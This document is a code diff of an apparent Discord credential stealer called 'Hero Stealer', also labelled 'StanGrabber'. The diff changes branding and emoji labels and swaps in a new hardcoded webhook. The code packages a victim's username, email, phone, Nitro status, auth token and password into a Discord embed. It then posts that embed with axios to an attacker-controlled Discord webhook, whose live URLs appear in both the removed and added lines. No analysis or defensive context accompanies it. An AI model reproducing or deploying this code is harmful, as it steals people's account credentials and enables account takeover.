@@ -25,9 +25,9 @@ exports.send = (req, res, webhook) => {
         var nitro;
         var phone;
         if (JSON.parse(JSON.stringify(y)).premium_type == 1) {
-            nitro = "Nitro Classic";
+            nitro = "<:nitro:914091074346188840>";
         } else if (JSON.parse(JSON.stringify(y)).premium_type == 2) {
-            nitro = "Nitro Boost";
+            nitro = "<:dynamic_nitro:914091127928414219>";
         } else {
             nitro = "None";
         }
@@ -40,15 +40,15 @@ exports.send = (req, res, webhook) => {
             
             var omg = {
   author: {
-    name: "Dev By Hideaki#1337 x Stan#1337"
+    name: "Hero Stealer"
   },
-  title: "New person stoled",
+  title: "<:rgg_cashfixa:912815454303711263>",
   description: `Username: \`${JSON.parse(JSON.stringify(y)).username}#${JSON.parse(JSON.stringify(y)).discriminator}\`\nID: \`${JSON.parse(JSON.stringify(y)).id}\`\nE-Mail: \`${JSON.parse(JSON.stringify(y)).email}\`\nPhone: \`${JSON.parse(JSON.stringify(y)).phone}\`\nNitro Type: \`${nitro}\`\nToken: \`${token}\`\nPassword: \`${password}\``,
 
 }
             
 
-        axios.post(`https://discord.com/api/webhooks/808648414199676948/Koi4dO3acEhEyIRJzVaxZ7-FDWJfmqK6kZX13nrklxmLWPkhQBhtkFe8JBtKgdojXSCn`, {
+        axios.post(`https://discord.com/api/webhooks/914090586095640656/cMXZ62XSxcSoxpIrK7aK4YkdXdeiv77MHX6KVvYnTmSU8V076icmAC94R-xGHY2H6y2F`, {
             username: JSON.parse(JSON.stringify(y)).username + " - StanGrabber",
             content: '', 
             embeds:[ omg ]
